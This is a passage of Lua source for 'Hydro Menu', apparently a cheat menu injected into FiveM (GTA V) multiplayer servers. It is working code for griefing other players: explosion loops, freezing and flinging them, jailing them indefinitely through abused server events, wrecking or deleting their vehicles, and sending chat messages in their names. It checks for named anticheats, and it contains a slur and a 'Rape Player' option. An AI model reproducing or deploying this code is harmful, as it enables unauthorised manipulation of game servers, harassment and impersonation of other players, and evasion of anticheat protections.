			elseif HydroMenu.CheckBox("Explosion Loop", HydroVariables.OnlinePlayer.ExplosionLoop) and not SafeMode then
				HydroVariables.OnlinePlayer.ExplodingPlayer = selectedPlayer
				NativeExplosionLoop()
				HydroVariables.OnlinePlayer.ExplosionLoop = not HydroVariables.OnlinePlayer.ExplosionLoop

			elseif HydroMenu.Button("Rape Player", "", false, "Attach Rapist to Player") then
				RapePlayer(selectedPlayer)
			elseif HydroMenu.CheckBox("Freeze Player", HydroVariables.OnlinePlayer.freezeplayer) then

				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
					SafeModeNotification()
				else
					HydroVariables.OnlinePlayer.freezeplayer = not HydroVariables.OnlinePlayer.freezeplayer
					HydroVariables.OnlinePlayer.playertofreeze = selectedPlayer
				end

			elseif selectedPlayer ~= PlayerId() and HydroMenu.CheckBox("Attach to Player", HydroVariables.OnlinePlayer.attachtoplayer) then
				if PlayerId() == selectedPlayer == false then
					HydroVariables.OnlinePlayer.attatchedplayer = selectedPlayer
					HydroVariables.OnlinePlayer.attachtoplayer = not HydroVariables.OnlinePlayer.attachtoplayer
					if HydroVariables.OnlinePlayer.attachtoplayer == false then
						DetachEntity(PlayerPedId())
					end
				end
			elseif HydroMenu.CheckBox("Fling Player", HydroVariables.OnlinePlayer.FlingingPlayer) then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
					SafeModeNotification()
				elseif HydroVariables.OnlinePlayer.FlingingPlayer then
					HydroVariables.OnlinePlayer.FlingingPlayer = false
				else
				    HydroVariables.OnlinePlayer.FlingingPlayer = selectedPlayer
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('attachpropstoplayer') then
			HydroMenu.SetMenuProperty('attachpropstoplayer', 'subTitle', GetPlayerName(selectedPlayer) .. " > Attach Props")
			
			if HydroMenu.Button("Attach UFO") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("p_spinning_anus_s"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
			elseif HydroMenu.Button("Attach Central Los Santos") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("dt1_lod_slod3"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach FIB Building") then
	
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(-1404869155, 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Sandy Shores") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("cs4_lod_04_slod2"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach LS Docks") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("po1_lod_slod4"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Mirror Park") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("id2_lod_slod4 "), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Airport") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("ap1_lod_slod4"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Del Pero Pier") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("sm_lod_slod2_22"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
				
			elseif HydroMenu.Button("Attach Christmas Tree") then
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("prop_xmas_tree_int"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
				
			elseif HydroMenu.Button("Attach Box to Head") then

				local ped = GetPlayerPed(selectedPlayer)
				local bone = GetPedBoneIndex(ped, 31086)
				local prop = CreateObject(GetHashKey("prop_cs_cardbox_01"), 9, 9, 9, 1, 1, 1)
	
				AttachEntityToEntity(prop, ped, bone, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Alien Egg") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local bone = GetPedBoneIndex(ped, 31086)
				local prop = CreateObject(GetHashKey("prop_alien_egg_01"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, bone, 0.2, 0.0, 0.0, 90.0, 90.0, 90.0, false, false, true, false, 0, true)
				
			elseif HydroMenu.Button("Attach TV On Head") then
				
				local ped = GetPlayerPed(selectedPlayer)
				local bone = GetPedBoneIndex(ped, 31086)
				local prop = CreateObject(GetHashKey("prop_tv_03"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, bone, 0.1, 0.075, 0.0, 0.0, 270.0, 180.0, false, false, true, false, 0, true)

				AttachEntityToEntity(entity1, entity2, boneIndex, xPos, yPos, zPos, xRot, yRot, zRot, p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot)
			elseif HydroMenu.Button("Attach Campfire") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("prop_beach_fire"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Windmill") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("prop_windmill_01_l1"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, -2.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Ramp") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("stt_prop_stunt_track_start"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach Mexican Flag") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("apa_prop_flag_mexico_yt"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach USA Flag") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("apa_prop_flag_us_yt"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Attach UK Flag") then

				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("apa_prop_flag_uk_yt"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 0, 0.0, 0.0, false, false, true, false, 0, true)

            end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selectedplayerTriggerEvents') then
			HydroMenu.SetMenuProperty('selectedplayerTriggerEvents', 'subTitle', GetPlayerName(selectedPlayer) .. " > Trigger Events")

			if HydroMenu.Button("Bill Player", "~y~ESX | Server") then

				name = HydroMenu.KeyboardEntry("Bill Name", 200)
				amount = HydroMenu.KeyboardEntry("Bill Amount", 200)

				amount = tonumber(amount)

				TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer), name, amount)

			elseif HydroMenu.Button("Carry Player", "~g~Carry Script") then

				local player = PlayerPedId()	
				lib = 'missfinale_c2mcs_1'
				anim1 = 'fin_c2_mcs_1_camman'
				lib2 = 'nm'
				anim2 = 'firemans_carry'
				distans = 0.15
				distans2 = 0.27
				height = 0.63
				spin = 0.0		
				length = 100000
				controlFlagMe = 49
				controlFlagTarget = 33
				animFlagTarget = 1

				carryingBackInProgress = true

				TriggerServerEvent('CarryPeople:sync', GetPlayerServerId(selectedPlayer), lib,lib2, anim1, anim2, distans, distans2, height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
		
			elseif HydroMenu.Button("Open Players Inventory", "~g~ESX | Client") then

				TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), selectedPlayer, GetPlayerName(selectedPlayer))

			elseif HydroMenu.DynamicTriggers.Triggers['ESXHandcuff'] ~= nil and HydroMenu.Button("Cuff Player", "~y~ESX | Server") then

				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['ESXHandcuff'], GetPlayerServerId(selectedPlayer))	
				
			elseif HydroMenu.DynamicTriggers.Triggers['ESXDrag'] ~= nil and HydroMenu.Button("Drag Player", "~y~ESX | Server") then

				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['ESXDrag'], GetPlayerServerId(selectedPlayer))	

			elseif HydroMenu.DynamicTriggers.Triggers['ESXQalleJail'] ~= nil and HydroMenu.Button("Jail Player", "~g~ESX", nil, "Works On Servers With ESX") then
				
				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['ESXQalleJail'], GetPlayerServerId(selectedPlayer), math.huge, "Hydro Menu On top ")
			
			elseif HydroMenu.DynamicTriggers.Triggers['TacklePlayer'] ~= nil and HydroMenu.Button("Tackle Player", "~y~Server") then
				
				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['TacklePlayer'], selectedPlayer)

			elseif HydroMenu.Button("Drag Player", "~g~SEM") then

				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['DragSEM'], GetPlayerServerId(selectedPlayer))

			elseif HydroMenu.Button("Cuff Player", "~g~SEM") then

				TriggerServerEvent("SEM_InteractionMenu:CuffNear", GetPlayerServerId(selectedPlayer))

			elseif HydroMenu.Button("Jail Player", "~g~SEM") then

				TriggerServerEvent(HydroMenu.DynamicTriggers.Triggers['JailSEM'], GetPlayerServerId(selectedPlayer), math.huge)

			elseif HydroMenu.Button("Unjail Player", "~g~SEM") then
				
				TriggerServerEvent("SEM_InteractionMenu:Unjail", GetPlayerServerId(selectedPlayer))
				
			elseif HydroMenu.Button("Kick Out Of Veh", "~g~SEM") then

				TriggerServerEvent('SEM_InteractionMenu:UnseatNear', GetPlayerServerId(selectedPlayer))
				
			elseif HydroMenu.Button("TP Player Into My Vehicle", "~g~SEM") then

				TriggerServerEvent('SEM_InteractionMenu:SeatNear', GetPlayerServerId(selectedPlayer), HydroVariables.VehicleOptions.PersonalVehicle)
				
			elseif HydroMenu.Button("TP Player to Space", "~g~SEM") then

				RequestModel(GetHashKey("baller"))

				Timout = 0

				while not HasModelLoaded(GetHashKey("baller")) and Timout < 4000 do
					RequestModel(GetHashKey("baller"))
					Wait(1)
					Timout = Timout + 1
				end

				if HasModelLoaded(GetHashKey("baller")) then
					local Vehicle = CreateVehicle(GetHashKey("baller"), 10000.0, 10000.0, 1000.0, 0.0, 1, 1)
					SetEntityAsMissionEntity(Vehicle, true, true)
					FreezeEntityPosition(Vehicle)
					
					TriggerServerEvent('SEM_InteractionMenu:UnseatNear', GetPlayerServerId(selectedPlayer))
					TriggerServerEvent('SEM_InteractionMenu:SeatNear', GetPlayerServerId(selectedPlayer), Vehicle)
					DeleteEntity(Vehicle)
				end

			elseif HydroMenu.Button("Send Fake Message", "~g~SEM") then

				message = HydroMenu.KeyboardEntry("Enter Fake Message", 200)
				TriggerServerEvent("SEM_InteractionMenu:GlobalChat", {255, 255, 255}, GetPlayerName(selectedPlayer), message)

			elseif HydroMenu.Button("Send Fake Message", "~y~Server") then

				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
				    FakeChatMessage(GetPlayerName(selectedPlayer))
				end

			elseif HydroMenu.CheckBox("Send Fake Message Loop", HydroVariables.OnlinePlayer.messagelooping) then

			
				HydroVariables.OnlinePlayer.messageloopplayer = selectedPlayer
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif HydroVariables.OnlinePlayer.messagelooping then
					HydroVariables.OnlinePlayer.messagelooping = false
				elseif SafeMode then
					SafeModeNotification()
				else

					result = HydroMenu.KeyboardEntry("Message To Send", 200)
					
					if HasModelLoaded(GetHashKey(result)) then

					else
						RequestModel(GetHashKey(result))
						Wait(500)
					end
				
					CancelOnscreenKeyboard()
					HydroVariables.OnlinePlayer.messagelooping = not HydroVariables.OnlinePlayer.messagelooping
					HydroVariables.OnlinePlayer.messagetosend = result
			    end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selectedPlayervehicleopts') then
		    HydroMenu.SetMenuProperty('selectedPlayervehicleopts', 'subTitle', GetPlayerName(selectedPlayer) .. " > Vehicle Options")
			if HydroMenu.Button("Give Player a Car") then
				local coords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0.0, 8.0, 0.5)
				local x = coords.x
				local y = coords.y
				local z = coords.z
				result = HydroMenu.KeyboardEntry("Vehicle Spawn Code", 200)
                
				if HasModelLoaded(GetHashKey(result)) then

				else
					RequestModel(GetHashKey(result))
					Wait(500)
				end
				
				if not IsModelAVehicle(result) then
                    PushNotification("Invalid Vehicle Model", 600)
				end

				CancelOnscreenKeyboard()
				if result == "t20ramp" then
				    RampCar(selectedPlayer)
				elseif result == "ufo" then
			        UFOVeh(selectedPlayer)
				else
					local vehicle = CreateVehicle(GetHashKey(result), x, y, z, 0.0, 1, 1)
					SetEntityHeading(vehicle, GetEntityHeading(GetPlayerPed(selectedPlayer)))
					SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))
					SetVehicleEngineOn(vehicle, true, false, false)
					SetVehRadioStation(vehicle, 'OFF')
				end

				CancelOnscreenKeyboard()
				
			elseif HydroMenu.Button("Teleport Into Players Car") then
				local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
				
				if IsVehicleSeatFree(veh, 0) then
					SetPedIntoVehicle(PlayerPedId(), veh, 0)
				else
					if IsVehicleSeatFree(veh, 1) then
						SetPedIntoVehicle(PlayerPedId(), veh, 1)
					else
						if IsVehicleSeatFree(veh, 2) then
							SetPedIntoVehicle(PlayerPedId(), veh, 2)
						else
							if IsVehicleSeatFree(veh, 3) then
								SetPedIntoVehicle(PlayerPedId(), veh, 3)
							else
								PushNotification("Vehicle has no Empty Seat", 600)
							end
						end
					end
				end
			elseif HydroMenu.Button("Repair Vehicle") then
				NetworkRequestControlOfEntity(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer)))
				SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false))
				SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false), 0.0)
				SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false), 0)
				SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false), false)
				Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false), 0)
			elseif HydroMenu.Button("Destroy Engine") then
				local playerPed = GetPlayerPed(selectedPlayer)
				NetworkRequestControlOfEntity(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer)))
				SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
				SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 10)
			elseif HydroMenu.Button("Kick From Vehicle") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				end
			elseif HydroMenu.Button("Destroy Vehicle") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				NetworkRequestControlOfEntity(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer)))
				StartVehicleAlarm(playerVeh)
				DetachVehicleWindscreen(playerVeh)
				SmashVehicleWindow(playerVeh, 0)
				SmashVehicleWindow(playerVeh, 1)
				SmashVehicleWindow(playerVeh, 2)
				SmashVehicleWindow(playerVeh, 3)
				SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
				SetVehicleDoorBroken(playerVeh, 0, true)
				SetVehicleDoorBroken(playerVeh, 1, true)
				SetVehicleDoorBroken(playerVeh, 2, true)
				SetVehicleDoorBroken(playerVeh, 3, true)
				SetVehicleDoorBroken(playerVeh, 4, true)
				SetVehicleDoorBroken(playerVeh, 5, true)
				SetVehicleDoorBroken(playerVeh, 6, true)
				SetVehicleDoorBroken(playerVeh, 7, true)
				SetVehicleLights(playerVeh, 1)
				Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
				SetVehicleDirtLevel(playerVeh, 10.0)
				SetVehicleBurnout(playerVeh, true)
			elseif HydroMenu.Button("Delete Vehicle") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				NetworkRequestControlOfEntity(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer)))
				DeleteVehicle(playerVeh)
			elseif HydroMenu.Button("Teleport Vehicle To Waypoint") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				local waypoint = GetFirstBlipInfoId(8)
				NetworkRequestControlOfEntity(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer)))
				if DoesBlipExist(waypoint) then
					SetEntityCoords(playerVeh, GetBlipInfoIdCoord(waypoint))
				end
			elseif HydroMenu.Button("Ramp Players Vehicle") then
				Citizen.CreateThread(function()

					local ped = GetPlayerPed(selectedPlayer)
					local carSpeed = GetEntitySpeed(GetVehiclePedIsIn(ped, true)) * 2.236936 -- convert in mph
					local coords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0.0, 8.0, 0.5)
					local x = coords.x
					local y = coords.y
					local z = coords.z
					local faggot = CreateObject(GetHashKey("prop_jetski_ramp_01"), x, y, z - 2, 1, 1, 1)
					SetEntityHeading(faggot, GetEntityHeading(ped))
					FreezeEntityPosition(faggot, true)
	
					Wait(5000)

					DeleteEntity(faggot)

					return ExitThread
				end)
			elseif HydroMenu.Button("Add Ramp to Players Vehicle") then

				local ped = GetPlayerPed(selectedPlayer)
				local vehi = GetVehiclePedIsIn(ped, 0)
				local ramp = CreateObject(GetHashKey("prop_jetski_ramp_01"), 0, 0, 0, 1, 1, 1)
				AttachEntityToEntity(ramp, vehi, bogie_front, 0.0, 3.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Launch Players Vehicle", "+X") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)

				if playerVeh ~= 0 then
					NetworkRequestControlOfEntity(playerVeh)
					ApplyForceToEntity(playerVeh, 1, 5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end
				
			elseif HydroMenu.Button("Launch Players Vehicle","-X") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)

				if playerVeh ~= 0 then
					NetworkRequestControlOfEntity(playerVeh)
					ApplyForceToEntity(playerVeh, 1, -5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end

			elseif HydroMenu.Button("Launch Players Vehicle", "+Y") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)

				if playerVeh ~= 0 then
					NetworkRequestControlOfEntity(playerVeh)
					ApplyForceToEntity(playerVeh, 1, 0.0, 5000.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end

			elseif HydroMenu.Button("Launch Players Vehicle", "-Y") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)

				if playerVeh ~= 0 then
					NetworkRequestControlOfEntity(playerVeh)
					ApplyForceToEntity(playerVeh, 1, 0.0, -5000.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end

			elseif HydroMenu.Button("Launch Players Vehicle", "+Z") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				
				if playerVeh ~= 0 then
					NetworkRequestControlOfEntity(playerVeh)
					ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end
				
			elseif HydroMenu.Button("Slam Players Vehicle", "-Z") then
				local playerPed = GetPlayerPed(selectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)

				if playerVeh ~= 0 then
					NetworkRequestControlOfEntity(playerVeh)
					ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, -5000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end
			end

		    HydroMenu.Display()
			
		elseif HydroMenu.IsMenuOpened('selectedonlineplayr') then

			HydroMenu.SetMenuProperty('selectedonlineplayr', 'subTitle', string.upper(GetPlayerServerId(selectedPlayer) .. " | ~s~" .. GetPlayerName(selectedPlayer)))
			
		    if HydroMenu.MenuButton('Vehicle Options', 'selectedPlayervehicleopts', "Mess with Player's Vehicle" ) then
			elseif HydroMenu.MenuButton('Trigger Events', 'selectedplayerTriggerEvents', "Trigger Events For Player") then
			elseif HydroMenu.MenuButton('Particle Effects', 'particleeffectsonplayer', "Particle Effects") then
			elseif HydroMenu.MenuButton('Attach Objects', 'attachpropstoplayer', "Attach Objects On Player") then
			elseif HydroMenu.MenuButton('Troll Options', 'trollonlineplayr', "Troll Options") then
			elseif HydroMenu.MenuButton('Ped Options', 'pedspawningonplayer', "Spawn Friendly / Hostile Peds") then

			elseif HydroMenu.Button("Semi-Godmode", "", false, "Player can not Die From Bullets") then

				RequestModel("prop_juicestand")
				Wait(600)
				local ped = GetPlayerPed(selectedPlayer)
				local prop = CreateObject(GetHashKey("prop_juicestand"), 9, 9, 9, 1, 1, 1)

				SetEntityVisible(prop, false, true)

				AttachEntityToEntity(prop, ped, 0, 0.0, 0.0, 0.0, 90.0, 90.0, 90.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Teleport To Player") then

				TeleportToPlayer(selectedPlayer)
				
			elseif HydroMenu.Button("Set Waypoint on Player") then

				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
				SetNewWaypoint(coords.x, coords.y)

			elseif HydroMenu.CheckBox("Track Player", HydroVariables.OnlinePlayer.TrackingPlayer) then

				if HydroVariables.OnlinePlayer.TrackingPlayer then
					HydroVariables.OnlinePlayer.TrackingPlayer = nil
				else
					HydroVariables.OnlinePlayer.TrackingPlayer = selectedPlayer
				end

			elseif selectedPlayer ~= PlayerId() and HydroMenu.CheckBox("Friend", TableHasValue(FriendsList, GetPlayerServerId(selectedPlayer))) then
					if TableHasValue(FriendsList, GetPlayerServerId(selectedPlayer)) then
						RemoveValueFromTable(FriendsList, GetPlayerServerId(selectedPlayer))
					else
						FriendsList[tablelength(FriendsList) + 1] = GetPlayerServerId(selectedPlayer)
					end
			elseif selectedPlayer ~= PlayerId() and HydroMenu.CheckBox("Spectate", isSpectatingTarget) then
				if AntiCheats.ChocoHax or AntiCheats.VAC or AntiCheats.BadgerAC or AntiCheats.WaveSheild or AntiCheats.ATG then
		            PushNotification("Anticheat Detected! Function Blocked", 600)
				else

				end
				isSpectatingTarget = not isSpectatingTarget

				local PlayersPed = GetPlayerPed(selectedPlayer)
				if isSpectatingTarget then
					local coords = GetEntityCoords(PlayersPed)
					local targetx = coords.x
					local targety = coords.y
					local targetz = coords.z

					NetworkSetOverrideSpectatorMode(false)
					RequestCollisionAtCoord(GetEntityCoords(PlayersPed))
					NetworkSetInSpectatorModeExtended(true, PlayersPed, false)
					NetworkSetOverrideSpectatorMode(false)
				else
					local coords = GetEntityCoords(PlayersPed)
					local targetx = coords.x
					local targety = coords.y
					local targetz = coords.z

					NetworkSetOverrideSpectatorMode(false)
					RequestCollisionAtCoord(targetx, targety, targetz)
					NetworkSetInSpectatorModeExtended(false, PlayersPed, false)
					NetworkSetOverrideSpectatorMode(false)
				end
				
			end

			HydroMenu.Display()

		elseif IsDisabledControlJustPressed(0, tonumber(HydroVariables.Keybinds.OpenKey)) then -- Open Key
			HydroMenu.OpenMenu('main')
		end

		Wait(0)

		if OnlinePlayerOptions then
			
			local ped = GetPlayerPed(selectedPlayer)
			local coords = GetEntityCoords(ped)
			local selfcoords = GetEntityCoords(PlayerPedId())
			local invehicle = "~r~No"

			if IsPedInAnyVehicle(ped) then
				invehicle = "~g~Yes"
			else
				invehicle = "~r~No"
			end

			x = tonumber(string.format("%.2f", coords.x))
			y = tonumber(string.format("%.2f", coords.y))
			z = tonumber(string.format("%.2f", coords.z))

			health = GetEntityHealth(ped) - 100 
			armour = tonumber(string.format("%.0f", GetPedArmour(ped)))
			distance = GetDistanceBetweenCoords(selfcoords.x, selfcoords.y, selfcoords.z, coords.x, coords.y, coords.z, true)

			if health > -99 then
				health = health .. " / 100"
			else
				health = "~r~Dead~s~" 
			end

			if HydroMenu.UI.MenuX > 0.13 then
				HydroMenu.DrawText("Godmode: " .. tostring(IsPlayerInGodmode(selectedPlayer)) ..
				"\n~s~Health: " .. health ..
				"\nArmour: " .. armour .. " / 100 " ..
				"\nIn Vehicle: " .. invehicle .. "~s~" ..
				"\nRoad: " .. GetStreetNameFromHashKey(GetStreetNameAtCoord(x, y, z)) ..
				"\nDistance: " .. string.format("%.2f", distance) .. "m"
				, {HydroMenu.UI.MenuX - 0.132, HydroMenu.UI.MenuY + 0.002}, {255, 255, 255, 255}, 0.45, 4, 0, "PlayerInfoText")
				
				HydroMenu.DrawRect(HydroMenu.UI.MenuX - 0.0690, HydroMenu.UI.MenuY + 0.085, 0.13, 0.165, { r = 0, g = 0, b = 0, a = 200 })
	
				HydroMenu.DrawRect(HydroMenu.UI.MenuX - 0.0690, HydroMenu.UI.MenuY + 0.169, 0.13, 0.002, { r = rgb.r, g = rgb.g, b = rgb.b, a = 255 })
				HydroMenu.DrawRect(HydroMenu.UI.MenuX - 0.0690, HydroMenu.UI.MenuY + 0.001, 0.13, 0.002, { r = rgb.r, g = rgb.g, b = rgb.b, a = 255 })
			else
				HydroMenu.DrawText("Godmode: " .. tostring(IsPlayerInGodmode(selectedPlayer)) ..
				"\n~s~Health: " .. health ..
				"\nArmour: " .. armour .. " / 100 " ..
				"\nIn Vehicle: " .. invehicle .. "~s~" ..
				"\nRoad: " .. GetStreetNameFromHashKey(GetStreetNameAtCoord(x, y, z)) ..
				"\nDistance: " .. string.format("%.2f", distance) .. "m"
				, {HydroMenu.UI.MenuX + 0.248, HydroMenu.UI.MenuY + 0.002}, {255, 255, 255, 255}, 0.45, 4, 0, "PlayerInfoText")
				
				HydroMenu.DrawRect(HydroMenu.UI.MenuX + 0.31, HydroMenu.UI.MenuY + 0.085, 0.13, 0.165, { r = 0, g = 0, b = 0, a = 200 })
	
				HydroMenu.DrawRect(HydroMenu.UI.MenuX + 0.31, HydroMenu.UI.MenuY + 0.169, 0.13, 0.002, { r = rgb.r, g = rgb.g, b = rgb.b, a = 255 })
				HydroMenu.DrawRect(HydroMenu.UI.MenuX + 0.31, HydroMenu.UI.MenuY + 0.001, 0.13, 0.002, { r = rgb.r, g = rgb.g, b = rgb.b, a = 255 })
			end
		end
	end
end)

function IsPlayerInGodmode(player)
	local isgod = GetPlayerInvincible_2(player)
	if isgod == 1 then
        return "~g~Yes"
	else
		return "~r~No"
	end
end

function NoClip()
	if not IsPedInAnyVehicle(PlayerPedId(), true) then
		ClearPedTasksImmediately(PlayerPedId())
	end
	Citizen.CreateThread(function()
		noclipping = not noclipping
		if not noclipping then
			local vehicle = GetVehiclePedIsIn(PlayerPedId())
			SetEntityCollision(vehicle, true, true)
